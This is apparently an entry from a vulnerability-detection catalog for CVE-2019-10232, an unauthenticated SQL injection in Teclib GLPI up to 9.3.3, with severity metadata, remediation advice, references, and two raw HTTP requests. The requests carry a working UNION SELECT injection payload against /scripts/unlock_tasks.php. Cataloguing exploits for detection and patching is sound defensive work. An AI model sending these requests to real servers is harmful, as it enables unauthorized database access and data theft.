---
layout: post
cve_id: CVE-2019-10232
title: Teclib GLPI <= 9.3.3 - Unauthenticated SQL Injection
pcap: true
pcap_path: /pcaps/2019/CVE-2019-10232.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-10232.yaml
snort2_rule: N/A
snort3_rule: N/A
author: RedTeamBrasil
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized access, data
  leakage, or data manipulation.

  '
remediation: 'Upgrade to a patched version of Teclib GLPI (9.3.4 or later) to mitigate
  this vulnerability.

  '
reference:
- https://www.synacktiv.com/ressources/advisories/GLPI_9.3.3_SQL_Injection.pdf
- https://github.com/glpi-project/glpi/commit/684d4fc423652ec7dde21cac4d41c2df53f56b3c
- https://nvd.nist.gov/vuln/detail/CVE-2019-10232
- https://github.com/ARPSyndicate/kenzer-templates
- https://github.com/HimmelAward/Goby_POC
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2019-10232
  cwe-id: CWE-89
  epss-score: 0.89565
  epss-percentile: 0.99532
  cpe: cpe:2.3:a:teclib-edition:gestionnaire_libre_de_parc_informatique:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: teclib-edition
  product: gestionnaire_libre_de_parc_informatique
tags:
- cve
- cve2019
- glpi
- sqli
- injection
- teclib-edition
- vkev
- vuln
---

## ðŸ” Vulnerability Description
Teclib GLPI <= 9.3.3 exposes a script (/scripts/unlock_tasks.php) that incorrectly sanitizes user controlled data before using it in SQL queries. Thus, an attacker could abuse the affected feature to alter the semantic original SQL query and retrieve database records.

## ðŸŒ HTTP Request
```nohighlight
GET /glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.4.21
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

